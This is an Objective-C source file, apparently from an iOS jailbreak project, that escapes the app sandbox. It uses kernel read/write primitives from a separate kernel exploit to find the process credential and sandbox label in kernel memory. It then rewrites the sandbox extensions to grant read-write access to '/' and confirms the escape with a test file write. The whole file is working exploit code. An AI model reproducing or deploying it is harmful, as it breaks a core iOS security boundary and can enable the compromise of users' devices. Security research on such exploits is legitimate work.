/*
 * sandbox_escape.m — based on lara/sbx.m by rooootdev
 * Uses early_kread/early_kwrite32bytes (0x20 byte ops) directly.
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <mach/machine.h>
#include "sandbox_escape.h"
#include "../kexploit/kexploit_opa334.h"
#include "../kexploit/krw.h"
#include "../kexploit/offsets.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);

#define KRW_LEN 0x20

#define OFF_PROC_PROC_RO       0x18
#define OFF_UCRED_CR_LABEL     0x78
#define OFF_LABEL_SANDBOX      0x10
#define OFF_SANDBOX_EXT_SET    0x10
#define OFF_EXT_DATA           0x40
#define OFF_EXT_DATALEN        0x48

#define T1SZ_BOOT 0x19

static bool _ispac(void) {
    cpu_subtype_t sub = 0;
    size_t sz = sizeof(sub);
    if (sysctlbyname("hw.cpusubtype", &sub, &sz, NULL, 0) != 0) return false;
    return sub == CPU_SUBTYPE_ARM64E;
}

static inline uint64_t _xpaci(uint64_t a) {
    if (!_ispac()) return a;
    if ((a & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) return a;
    register uint64_t x0 asm("x0") = a;
    asm volatile(".long 0xDAC143E0" : "+r"(x0));
    return x0;
}

static inline uint64_t _signptr(uint64_t v) {
    if ((v >> 32) > 0xFFFF) return v | 0xFFFFFF8000000000ULL;
    return v;
}

#define S(x) ({ uint64_t _v = _xpaci(x); _signptr(_v); })
#define K(x) ((x) > 0xFFFFFF8000000000ULL)

static uint64_t _smrdecode(uint64_t value, uint64_t base) {
    uint64_t bits = (base << (62 - T1SZ_BOOT));
    if ((value & bits) == 0)
        return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
    return (value & 0xFFFFFFFFFFFFFFE0ULL);
}

static uint64_t _kreadsmr(uint64_t raw) {
    uint64_t pac = S(raw);
    if (K(pac)) return pac;
    uint64_t d2 = _smrdecode(pac, 2);
    if (K(d2)) return d2;
    uint64_t d3 = _smrdecode(pac, 3);
    if (K(d3)) return d3;
    return pac;
}

/* Read/write using early_kread/early_kwrite32bytes only */
static uint64_t kr64(uint64_t addr) {
    return early_kread64(addr);
}

static void kr(uint64_t addr, void *buf, size_t len) {
    early_kread(addr, buf, len);
}

static void kw(uint64_t addr, void *buf, size_t len) {
    early_kwrite32bytes(addr, buf);
}

static void kw64(uint64_t addr, uint64_t val) {
    early_kwrite64(addr, val);
}

#pragma mark - Extension patching (from lara/sbx.m)

static void patchext(uint64_t ext) {
    uint64_t da = kr64(ext + OFF_EXT_DATA);
    uint64_t dl = kr64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        kr(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        kw(da, buf, KRW_LEN);
    }
    uint8_t chunk[KRW_LEN];
    kr(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    kw(ext + OFF_EXT_DATA, chunk, KRW_LEN);
}

static int patchchain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(kr64(hdr + 0x8));
        if (K(ext)) { patchext(ext); n++; }
        uint64_t next = kr64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

static void setrwclass(uint64_t hdr) {
    uint64_t ext = S(kr64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = kr64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    kw(da + 32, b1, KRW_LEN);
    kw(da + 64, b2, KRW_LEN);

    uint8_t hb[KRW_LEN];
    kr(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;
    kw(hdr, hb, KRW_LEN);
}

#pragma mark - Main entry

int sandbox_escape(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[SBX] proc is NULL"); return -1; }

    uint64_t proc_ro_raw = kr64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    NSLog(@"[SBX] proc=0x%llx proc_ro=0x%llx", self_proc, proc_ro);
    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }

    // Scan proc_ro for ucred (SMR pointer)
    NSLog(@"[SBX] scanning proc_ro for ucred...");
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = kr64(proc_ro + off);
        uint64_t smr = _kreadsmr(raw);
        uint64_t pac = S(raw);

        if (K(smr)) {
            uint64_t ml = S(kr64(smr + OFF_UCRED_CR_LABEL));
            if (K(ml)) {
                uint64_t ms = S(kr64(ml + OFF_LABEL_SANDBOX));
                if (K(ms)) {
                    NSLog(@"[SBX] ucred at +0x%x (SMR) = 0x%llx", off, smr);
                    ucred = smr; break;
                }
            }
        }
        if (!ucred && K(pac)) {
            uint64_t ml = S(kr64(pac + OFF_UCRED_CR_LABEL));
            if (K(ml)) {
                uint64_t ms = S(kr64(ml + OFF_LABEL_SANDBOX));
                if (K(ms)) {
                    NSLog(@"[SBX] ucred at +0x%x (PAC) = 0x%llx", off, pac);
                    ucred = pac; break;
                }
            }
        }
    }
    if (!K(ucred)) { NSLog(@"[SBX] ucred not found"); return -1; }

    uint64_t label = S(kr64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }

    uint64_t sandbox = S(kr64(label + OFF_LABEL_SANDBOX));
    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }

    uint64_t ext_set = S(kr64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }

    NSLog(@"[SBX] ucred=0x%llx label=0x%llx sbx=0x%llx ext=0x%llx",
          ucred, label, sandbox, ext_set);

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(kr64(ext_set + s * 8));
        if (K(hdr)) patched += patchchain(hdr);
    }
    NSLog(@"[SBX] patched %d extensions", patched);

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(kr64(ext_set + s * 8));
        if (K(hdr) && K(kr64(hdr + 0x10))) { setrwclass(hdr); classed++; }
    }
    NSLog(@"[SBX] changed %d classes", classed);

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(kr64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = kr64(ext_set + s * 8);
            if (!h || !K(h)) { kw64(ext_set + s * 8, src); filled++; }
        }
        NSLog(@"[SBX] filled %d empty slots", filled);
    }

    int fd = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        close(fd); unlink("/var/mobile/.sbx_test");
        NSLog(@"[SBX] *** SANDBOX ESCAPED ***");
        return 0;
    }
    NSLog(@"[SBX] verify failed errno=%d (%s), patched=%d",
          errno, strerror(errno), patched);
    return (patched > 0) ? 0 : -1;
}
